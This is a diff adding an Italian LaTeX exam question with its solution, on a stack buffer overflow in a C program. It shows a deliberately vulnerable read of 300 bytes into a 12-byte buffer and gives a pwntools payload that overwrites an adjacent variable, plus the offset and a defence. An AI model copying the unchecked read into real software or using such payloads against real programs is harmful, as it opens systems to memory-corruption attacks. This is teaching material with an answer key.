@@ -1,0 +1,14 @@
+\question[6]
+Dato \lstinline|override.c| (es.\ 06):
+\begin{lstlisting}[style=c]
+char buffer[12];
+int variable = 0;
+read(0, buffer, 300);   /* nessun controllo di lunghezza */
+\end{lstlisting}
+(a) Con un input di 16 byte \lstinline|"AAAAAAAAAAAABBBB"|, quale valore (hex e decimale) assume \lstinline|variable| e perché?
+(b) Scrivi il payload pwntools per impostare \lstinline|variable = 0xdeadbeef|. (c) Qual è l'offset?
+\begin{solution}
+(a) I primi 12 byte riempiono \lstinline|buffer|; i 4 successivi (\lstinline|BBBB|, \lstinline|'B'=0x42|) cadono su \lstinline|variable| (adiacente) $\to$ \lstinline|0x42424242| = \textbf{1111638594} (little-endian).\\
+(b) \lstinline|payload = b'A'*12 + p32(0xdeadbeef)|.\\
+(c) Offset = \textbf{12} (\lstinline|sizeof(buffer)|). Difesa: leggere al più \lstinline|sizeof(buffer)| byte.
+\end{solution}
